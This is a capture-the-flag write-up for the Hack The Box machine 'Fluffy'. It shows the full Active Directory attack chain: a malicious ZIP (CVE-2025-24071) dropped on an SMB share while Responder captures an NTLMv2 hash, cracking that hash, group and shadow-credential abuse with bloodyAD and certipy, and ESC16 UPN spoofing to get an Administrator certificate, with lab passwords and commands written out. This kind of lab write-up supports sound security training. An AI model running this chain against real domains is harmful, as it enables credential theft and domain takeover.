# Hack The Box: Fluffy - Comprehensive Notes

Target IP: 10.129.27.206 (Dynamic)

Hostname: fluffy.htb

**AD Domain:** `FLUFFY` (DC01.fluffy.htb)

## 1. Scanning & Enumeration

### Network Scanning (Nmap)

**Open Ports:**

- `53/tcp` - DNS (Simple DNS Plus)
    
- `88/tcp` - Kerberos
    
- `139/445/tcp` - SMB (Windows)
    
- `389/636/tcp` - LDAP/LDAPS
    
- `5985/tcp` - WinRM (HTTP)
    
- `9389/tcp` - AD Web Services
    

**Key Findings:**

- **Domain:** `fluffy.htb`
    
- **DC Hostname:** `DC01`
    
- **OS:** Windows Server
    

### SMB Enumeration

Using assumed credentials `j.fleischman` / `J0elTHEM4n1990!`:

- **Shares:**
    
    - `IT` (Readable)
        
    - `NETLOGON`, `SYSVOL` (Standard)
        
- **Files Found (IT Share):**
    
    - `Everything-1.4.1.1026.x64.zip`
        
    - `Upgrade_Notice.pdf`
        
    - _Note:_ The PDF and software version hint at **CVE-2025-24071** involving the "Everything" file search utility.
        

### User Enumeration

Users identified via `enum4linux-ng` and LDAP:

- `p.agila` (Target for initial pivot)
    
- `ca_svc` (Certificate Authority Service)
    
- `winrm_svc` (WinRM Service)
    
- `ldap_svc`, `j.coffey`, `Administrator`
    

## 2. Initial Access

### Exploit: CVE-2025-24071 ("Everything" Search Utility)

The installed "Everything" utility (v1.4.1) is vulnerable to a DLL loading or interaction issue that can be triggered via a malicious file on a share.

**Steps:**

1. **Preparation:** Downloaded a POC (e.g., `CVE-2025-24071_PoC`) to create a malicious ZIP file.
    
2. **Deployment:**
    
    - Start `Responder` on the attacker machine: `sudo responder -I tun0 -w -v`
        
    - Upload the malicious ZIP to the `IT` SMB share:
        
        ```
        smbclient //fluffy.htb/IT -U j.fleischman%'J0elTHEM4n1990!' -c 'put exploit.zip'
        ```
        
3. Capture:
    
    The malicious file triggered an authentication attempt back to the attacker machine.
    
    - **Captured User:** `p.agila`
        
    - **Hash:** NTLMv2
        

### Cracking Credentials

Cracked the captured hash using Hashcat/John:

- **Hash:** `p.agila::FLUFFY:7ee8...`
    
- **Wordlist:** `rockyou.txt`
    
- **Password:** `prometheusx-303`
    

## 3. Lateral Movement

### BloodHound Analysis

Using `bloodhound-python`, we analyzed the domain rights for `p.agila`:

```
bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -ns 10.129.205.30 -c All --zip
```

- **Finding:** `p.agila` has **GenericAll** privileges over the `SERVICE ACCOUNTS` group.
    

### Abuse: Shadow Credentials (winrm_svc)

Since `p.agila` controls the `SERVICE ACCOUNTS` group, we added `p.agila` to that group and then targeted other members, specifically `winrm_svc`.

1. **Add to Group:**
    
    ```
    bloodyAD --host dc01.fluffy.htb -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila
    ```
    
2. Target winrm_svc:
    
    Using certipy, we abused the group rights to create Shadow Credentials for winrm_svc to retrieve its NT hash.
    
    ```
    certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip 10.129.27.206
    ```
    
    - **Result:** NT Hash for `winrm_svc`.
        
3. Login:
    
    Verified access using evil-winrm:
    
    ```
    evil-winrm -i 10.129.27.206 -u winrm_svc -H <NTHash>
    ```
    

## 4. Privilege Escalation (Root)

### AD CS Enumeration (ESC16)

Using the compromised credentials (likely transitioning to `ca_svc` via similar group rights or `winrm_svc` access), we scanned for AD CS vulnerabilities.

- **Tool:** `certipy find`
    
- **Vulnerability:** **ESC16** (Security Extension Disabled on CA Globally).
    
- **Reference:** [Certipy ESC16 Documentation](https://github.com/ly4k/Certipy/wiki/06-%e2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally "null")
    

### Exploit: UPN Spoofing via ESC16

The ESC16 vulnerability allows a user to manipulate the `userPrincipalName` (UPN) to request certificates for other users (like Administrator).

**Steps:**

1. **Target:** `ca_svc` (This account was used as the pivot).
    
2. Spoof UPN: Change the UPN of ca_svc to Administrator.
    
    (Command via Certipy/BloodyAD to set UPN)
    
3. Request Certificate:
    
    Request a certificate using the standard User template. Because the UPN is now "Administrator", the CA issues a cert valid for the Admin.
    
    ```
    # (Conceptual command based on workflow)
    certipy req -u ca_svc ... -upn Administrator ...
    ```
    
4. **Restore UPN:** Reset `ca_svc`'s UPN to avoid detection/breakage.
    
5. Authenticate:
    
    Use the obtained administrator.pfx to authenticate as the Domain Admin.
    
    ```
    certipy auth -pfx administrator.pfx -dc-ip 10.129.27.206
    ```
    

**Result:** Retrieved `Administrator` hash/ticket. Access confirmed via `evil-winrm` or `secretsdump`.

**Status:** Machine Completed.